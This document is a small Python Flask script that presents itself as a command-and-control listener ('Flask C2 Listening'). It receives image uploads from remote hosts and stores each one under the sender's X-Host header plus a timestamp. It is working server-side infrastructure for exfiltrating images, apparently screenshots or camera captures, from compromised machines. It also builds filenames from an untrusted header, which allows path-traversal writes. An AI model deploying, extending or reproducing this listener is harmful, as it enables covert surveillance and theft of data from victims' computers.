from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    # Metadata
    host = request.headers.get('X-Host', 'unknown')
    timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
    filename = f"{host}_{timestamp}.jpg"

    # Save image data
    try:
        with open(filename, "wb") as f:
            f.write(request.data)
        print(f"[+] Received image: {filename}")
        return "OK", 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return "Error", 500

# Optional: define `/` route to avoid 404 if accessed manually
@app.route('/')
def index():
    return "📷 Flask C2 Listening...", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=12345)
